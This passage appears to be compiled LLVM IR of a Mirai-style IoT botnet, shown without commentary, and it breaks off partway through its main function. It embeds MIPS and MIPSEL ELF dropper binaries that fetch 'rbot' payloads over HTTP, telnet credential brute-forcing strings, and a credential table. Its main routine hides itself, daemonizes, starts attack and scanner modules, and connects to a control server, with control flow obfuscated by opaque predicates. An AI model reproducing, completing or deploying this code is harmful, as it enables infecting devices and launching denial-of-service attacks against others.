!\8F\99\80@\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00<\1C\00\05'\9C\80\A0\03\99\E0!'\BD\FF\E0\AF\BF\00\1C\AF\B0\00\18\AF\BC\00\10\8F\99\804\00\00\00\00\03 \F8\09\00\80\80!\8F\BC\00\10\ACP\00\00\8F\BF\00\1C\8F\B0\00\18$\02\FF\FF\03\E0\00\08'\BD\00 \00\00\00\00\00\00\00\00<\1C\00\05'\9C\80P\03\99\E0!\8F\82\800\03\E0\00\08\00\00\00\00\00\00\00\00\00\00\00\00mips\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.mips HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\80\00\00\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00D\06 \00@\05`\00@\01\9C\00@\02\10\00@\05\10\00@\01(\00@\01t\00@\00\A0\00@\01\C4\00@\00\C8\00@\00\E4\00@\04\A0\00@\01\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00@\00\A0\00\00\00\A0\00\00\04\E0\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00@\05\80\00\00\05\80\00\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\10\00\00\03\00D\05\C0\00\00\05\C0\00\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00D\06 \00\00\06\14\00\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\06\14\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\06\14\00\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00", align 1
@.str.19 = private unnamed_addr constant [1921 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00\08\00\01\00\00\00\84\04@\004\00\00\00h\06\00\00\07\10\00\004\00 \00\03\00(\00\07\00\06\00\01\00\00\00\00\00\00\00\00\00@\00\00\00@\00\D4\05\00\00\D4\05\00\00\05\00\00\00\00\00\01\00\01\00\00\00\E0\05\00\00\E0\05D\00\E0\05D\00T\00\00\00p\00\00\00\06\00\00\00\00\00\01\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\FF\00\A50\00,\05\00\00&\04\00% \85\00\FF\00\E70\FF\00\C60% \87\00\002\06\00%0\C4\00\02\22\06\00\00\FF\C30\00\1A\03\00\00\FF\840\00\16\06\00\026\06\00%\10C\00%0\C4\00\08\00\E0\03%\10F\00\05\00\1C<\E4\84\9C'!\E0\99\03\5C\80\99\8F!(\80\00\08\00 \03\A1\0F\04$\05\00\1C<\C8\84\9C'!\E0\99\03\5C\80\99\8F!(\80\00\08\00 \03\A6\0F\04$\05\00\1C<\AC\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A5\0F\04$\05\00\1C<\84\84\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\5C\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\03\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<8\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A4\0F\04$\05\00\1C<\10\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A3\0F\04$\05\00\1C<\E8\83\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\5C\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\01\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<\9C\83\9C'!\E0\99\03@\FF\BD'\BC\00\BF\AF\B8\00\B2\AF\B4\00\B1\AF\B0\00\B0\AF\10\00\BC\AF\18\80\82\8F\00\00\00\00\A0\05P$\00\00\02\82\00\00\00\00\FD\FF@\14\01\00\10&\FF\FF\10&\02\00\02$\1C\00\A2\A7\00P\02$\1E\00\A2\A7\18\80\82\8FL\80\99\8F\D0\00\07$\B0\00\04$k\00\05$\85\00\06$\A0\05B$\09\F8 \03#\80\02\02\10\00\BC\8F\01\03\05$\18\80\84\8F`\80\99\8F\A8\05\84$\FF\01\06$\09\F8 \03 \00\A2\AF\10\00\BC\8F\02\00\04$P\80\99\8F\02\00\05$!0\00\00\09\F8 \03!\90@\00!\88@\00\FF\FF\02$\10\00\BC\8F\03\00\22\12\00\00\00\00\07\00B\16\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\01\00\04$\10\00\BC\8F\00\00\00\00D\80\99\8F!  \02\1C\00\A5'\09\F8 \03\10\00\06$\10\00\BC\8F\07\00A\04\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03# \02\00\10\00\BC\8F\00\00\00\00\18\80\85\8FH\80\99\8F\17\00\10&\B8\05\A5$!  \02\09\F8 \03!0\00\02\10\00\BC\8F\07\00P\10!\80\00\00T\80\99\8F\00\00\00\00\09\F8 \03\03\00\04$\10\00\BC\8F!\80\00\008\80\99\8F!  \02\18\00\A5'\09\F8 \03\01\00\06$\10\00\BC\8F\01\00\03$T\80\99\8F\04\00C\10\04\00\04$\09\F8 \03\00\00\00\00\10\00\BC\8F\18\00\A3\83\00\12\10\00%\80C\00\0A\0D\02<\0A\0DB4\ED\FF\02\16\00\00\00\008\80\99\8F,\00\B0'!  \02!(\00\02\09\F8 \03\80\00\06$\10\00\BC\8F!(\00\02H\80\99\8F!0@\00\06\00@\18! @\02\09\F8 \03\00\00\00\00\10\00\BC\8F\F0\FF\00\10\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03!  \02\10\00\BC\8F\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03! @\02\10\00\BC\8F\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\05\00\04$\10\00\BC\8F\BC\00\BF\8F\B8\00\B2\8F\B4\00\B1\8F\B0\00\B0\8F\08\00\E0\03\C0\00\BD'\05\00\1C<L\81\9C'!\E0\99\03!\00\E0\03\01\00\11\04\00\00\00\00\05\00\1C<4\81\9C'!\E0\9F\03!\F8\00\00<\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<\10\81\9C'!\E0\99\03!\10\80\00! \A0\00!(\C0\00!0\E0\00\10\00\A7\8F\14\00\A8\8F\18\00\A9\8F\1C\00\AA\8F\E0\FF\BD'\10\00\A8\AF\14\00\A9\AF\18\00\AA\AF\1C\00\A2\AF\1C\00\A2\8F\0C\00\00\00\03\00\E0\14 \00\BD'\08\00\E0\03\00\00\00\00! @\00@\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<\A0\80\9C'!\E0\99\03\E0\FF\BD'\1C\00\BF\AF\18\00\B0\AF\10\00\BC\AF4\80\99\8F\00\00\00\00\09\F8 \03!\80\80\00\10\00\BC\8F\00\00P\AC\1C\00\BF\8F\18\00\B0\8F\FF\FF\02$\08\00\E0\03 \00\BD'\00\00\00\00\00\00\00\00\05\00\1C<P\80\9C'!\E0\99\030\80\82\8F\08\00\E0\03\00\00\00\00\00\00\00\00\00\00\00\00mpsl\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.mpsl HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\80\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00@\06D\00\80\05@\00\C0\01@\004\02@\000\05@\00L\01@\00\98\01@\00\A0\00@\00\E8\01@\00\EC\00@\00\08\01@\00\C0\04@\00$\01@\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\A0\00@\00\A0\00\00\00\00\05\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\A0\05@\00\A0\05\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\00\00\00\03\00\00\10\E0\05D\00\E0\05\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00\00\00@\06D\004\06\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\004\06\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\004\06\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.148 = private unnamed_addr constant [11 x i8] c"sage: wget\00", align 1
@.str.149 = private unnamed_addr constant [11 x i8] c"sage: tftp\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.1.5 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.2.6 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.3.7 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.4.8 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"/var/tmp/\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.7 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"/bin/\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"/etc/\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"/var/Sofia\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.128 = private unnamed_addr constant [9 x i8] c"FINISHED\00", align 1
@.str.129 = private unnamed_addr constant [7 x i8] c"BRUTED\00", align 1
@.str.127 = private unnamed_addr constant [68 x i8] c"[%d.%d.%d.%d:23] [%s:%s] [%s] [Status:%s] [Method:%d] [Attempt #%d]\00", align 1
@.str.136 = private unnamed_addr constant [6 x i8] c"ARMv7\00", align 1
@.str.137 = private unnamed_addr constant [6 x i8] c"ARMv6\00", align 1
@.str.138 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.131 = private unnamed_addr constant [5 x i8] c"\7FELF\00", align 1
@.str.132 = private unnamed_addr constant [6 x i8] c"arm64\00", align 1
@.str.133 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.134 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.135 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.139 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.140 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.141 = private unnamed_addr constant [10 x i8] c"ncomplete\00", align 1
@.str.142 = private unnamed_addr constant [15 x i8] c"attempt failed\00", align 1
@.str.143 = private unnamed_addr constant [6 x i8] c"% Bad\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.144 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.145 = private unnamed_addr constant [6 x i8] c"enter\00", align 1
@.str.146 = private unnamed_addr constant [4 x i8] c"ser\00", align 1
@.str.147 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = global i16 0, align 2
@auth_table_len = global i32 0, align 4
@auth_table = global %struct.scanner_auth* null, align 8
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [32 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca %struct.sockaddr_in, align 4
  %21 = alloca i32, align 4
  %22 = alloca %union.__SOCKADDR_ARG, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i16, align 2
  %28 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %8, align 4
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @unlink(i8* %31) #7
  %33 = call i32 @sigemptyset(%struct.__sigset_t* %9) #7
  %34 = call i32 @sigaddset(%struct.__sigset_t* %9, i32 2) #7
  %35 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %9, %struct.__sigset_t* null) #7
  %36 = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %37 = call void (i32)* @signal(i32 1, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %38 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i32 0, i32 0)) #7
  call void @table_init()
  call void @ensure_single_instance()
  call void @rand_init()
  %39 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 32, i32 16, i1 false)
  %40 = load i32, i32* %4, align 4
  %41 = icmp eq i32 %40, 2
  br i1 %41, label %42, label %78

; <label>:42:                                     ; preds = %2
  %43 = load i32, i32* @x
  %44 = load i32, i32* @y
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %42
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 1
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @util_strlen(i8* %53)
  %55 = icmp slt i32 %54, 32
  %56 = load i32, i32* @x
  %57 = load i32, i32* @y
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %55, label %64, label %78

; <label>:64:                                     ; preds = %originalBBpart2
  %65 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 1
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @util_strcpy(i8* %65, i8* %68)
  %70 = load i8**, i8*** %5, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 1
  %72 = load i8*, i8** %71, align 8
  %73 = load i8**, i8*** %5, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 1
  %75 = load i8*, i8** %74, align 8
  %76 = call i32 @util_strlen(i8* %75)
  %77 = sext i32 %76 to i64
  call void @llvm.memset.p0i8.i64(i8* %72, i8 0, i64 %77, i32 1, i1 false)
  br label %97

; <label>:78:                                     ; preds = %originalBBpart2, %2
  %79 = load i32, i32* @x
  %80 = load i32, i32* @y
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %78
  %87 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %88 = call i32 @util_strcpy(i8* %87, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0))
  %89 = load i32, i32* @x
  %90 = load i32, i32* @y
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %97

; <label>:97:                                     ; preds = %originalBBpart24, %64
  %98 = load i8**, i8*** %5, align 8
  %99 = getelementptr inbounds i8*, i8** %98, i64 0
  %100 = load i8*, i8** %99, align 8
  %101 = call i32 @util_strcpy(i8* %100, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i32 0, i32 0))
  %102 = call i32 (i32, ...) @prctl(i32 15, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i32 0, i32 0)) #7
  %103 = call i32 @fork() #7
  store i32 %103, i32* @pid1, align 4
  %104 = load i32, i32* @pid1, align 4
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %106, label %107

; <label>:106:                                    ; preds = %97
  call void @exit(i32 1) #8
  unreachable

; <label>:107:                                    ; preds = %97
  %108 = load i32, i32* @x
  %109 = load i32, i32* @y
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %107
  %116 = call i32 @fork() #7
  store i32 %116, i32* @pid2, align 4
  %117 = load i32, i32* @pid2, align 4
  %118 = icmp ne i32 %117, 0
  %119 = load i32, i32* @x
  %120 = load i32, i32* @y
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %118, label %127, label %128

; <label>:127:                                    ; preds = %originalBBpart28
  call void @exit(i32 1) #8
  unreachable

; <label>:128:                                    ; preds = %originalBBpart28
  %129 = call i32 @setsid() #7
  store i32 %129, i32* %7, align 4
  %130 = call i32 @close(i32 0)
  %131 = call i32 @close(i32 1)
  %132 = call i32 @close(i32 2)
  %133 = call signext i8 @attack_init()
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  br label %134

; <label>:134:                                    ; preds = %755, %originalBBpart2114, %originalBBpart2106, %597, %592, %originalBBpart290, %328, %128
  %135 = load i32, i32* @x
  %136 = load i32, i32* @y
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %134
  %143 = load i32, i32* @x
  %144 = load i32, i32* @y
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %151

; <label>:151:                                    ; preds = %originalBBpart212
  %152 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %153 = getelementptr inbounds [16 x i64], [16 x i64]* %152, i64 0, i64 0
  %154 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %153) #7, !srcloc !1
  %155 = extractvalue { i64, i64* } %154, 0
  %156 = extractvalue { i64, i64* } %154, 1
  %157 = trunc i64 %155 to i32
  store i32 %157, i32* %15, align 4
  %158 = ptrtoint i64* %156 to i64
  %159 = trunc i64 %158 to i32
  store i32 %159, i32* %16, align 4
  br label %160

; <label>:160:                                    ; preds = %151
  br label %161

; <label>:161:                                    ; preds = %160
  %162 = load i32, i32* @x
  %163 = load i32, i32* @y
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %161
  %170 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %171 = getelementptr inbounds [16 x i64], [16 x i64]* %170, i64 0, i64 0
  %172 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %171) #7, !srcloc !2
  %173 = extractvalue { i64, i64* } %172, 0
  %174 = extractvalue { i64, i64* } %172, 1
  %175 = trunc i64 %173 to i32
  store i32 %175, i32* %17, align 4
  %176 = ptrtoint i64* %174 to i64
  %177 = trunc i64 %176 to i32
  store i32 %177, i32* %18, align 4
  %178 = load i32, i32* @x
  %179 = load i32, i32* @y
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %186

; <label>:186:                                    ; preds = %originalBBpart216
  %187 = load i32, i32* @x
  %188 = load i32, i32* @y
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %186
  %195 = load i32, i32* @fd_ctrl, align 4
  %196 = icmp ne i32 %195, -1
  %197 = load i32, i32* @x
  %198 = load i32, i32* @y
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %196, label %205, label %233

; <label>:205:                                    ; preds = %originalBBpart220
  %206 = load i32, i32* @x
  %207 = load i32, i32* @y
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %205
  %214 = load i32, i32* @fd_ctrl, align 4
  %215 = srem i32 %214, 64
  %216 = zext i32 %215 to i64
  %217 = shl i64 1, %216
  %218 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %219 = load i32, i32* @fd_ctrl, align 4
  %220 = sdiv i32 %219, 64
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds [16 x i64], [16 x i64]* %218, i64 0, i64 %221
  %223 = load i64, i64* %222, align 8
  %224 = or i64 %223, %217
  store i64 %224, i64* %222, align 8
  %225 = load i32, i32* @x
  %226 = load i32, i32* @y
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBBpart241, label %originalBB22alteredBB

originalBBpart241:                                ; preds = %originalBB22
  br label %233

; <label>:233:                                    ; preds = %originalBBpart241, %originalBBpart220
  %234 = load i32, i32* @x
  %235 = load i32, i32* @y
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %233
  %242 = load i32, i32* @fd_serv, align 4
  %243 = icmp eq i32 %242, -1
  %244 = load i32, i32* @x
  %245 = load i32, i32* @y
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br i1 %243, label %252, label %253

; <label>:252:                                    ; preds = %originalBBpart245
  call void @establish_connection()
  br label %253

; <label>:253:                                    ; preds = %252, %originalBBpart245
  %254 = load i8, i8* @pending_connection, align 1
  %255 = icmp ne i8 %254, 0
  br i1 %255, label %256, label %268

; <label>:256:                                    ; preds = %253
  %257 = load i32, i32* @fd_serv, align 4
  %258 = srem i32 %257, 64
  %259 = zext i32 %258 to i64
  %260 = shl i64 1, %259
  %261 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %262 = load i32, i32* @fd_serv, align 4
  %263 = sdiv i32 %262, 64
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds [16 x i64], [16 x i64]* %261, i64 0, i64 %264
  %266 = load i64, i64* %265, align 8
  %267 = or i64 %266, %260
  store i64 %267, i64* %265, align 8
  br label %280

; <label>:268:                                    ; preds = %253
  %269 = load i32, i32* @fd_serv, align 4
  %270 = srem i32 %269, 64
  %271 = zext i32 %270 to i64
  %272 = shl i64 1, %271
  %273 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %274 = load i32, i32* @fd_serv, align 4
  %275 = sdiv i32 %274, 64
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds [16 x i64], [16 x i64]* %273, i64 0, i64 %276
  %278 = load i64, i64* %277, align 8
  %279 = or i64 %278, %272
  store i64 %279, i64* %277, align 8
  br label %280

; <label>:280:                                    ; preds = %268, %256
  %281 = load i32, i32* @x
  %282 = load i32, i32* @y
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %280
  %289 = load i32, i32* @fd_ctrl, align 4
  %290 = load i32, i32* @fd_serv, align 4
  %291 = icmp sgt i32 %289, %290
  %292 = load i32, i32* @x
